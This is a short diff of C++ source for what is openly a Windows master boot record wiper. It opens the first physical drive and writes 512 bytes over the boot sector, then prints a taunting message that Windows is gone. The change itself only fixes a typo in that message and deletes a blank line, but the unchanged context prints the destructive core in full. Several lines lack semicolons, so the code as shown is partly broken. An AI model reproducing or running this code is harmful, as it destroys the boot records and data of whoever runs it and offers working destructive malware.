@@ -18,7 +18,7 @@ int main(){
 
     HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL)
     if(WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE){
-        cout << "Master Boot Record Over Writed Tell Good Bye To Your Windows"
+        cout << "Master Boot Record Over Writted Tell Good Bye To Your Windows"
         sleep(5000)
         ExitProcess(0);
     }else{
@@ -26,7 +26,6 @@ int main(){
         sleep(5000)
         ExitProcess(0);
     }
-    
     CloseHandle(MasterBootRecord) //close handler
 
     return EXIT_SUCCESS //return
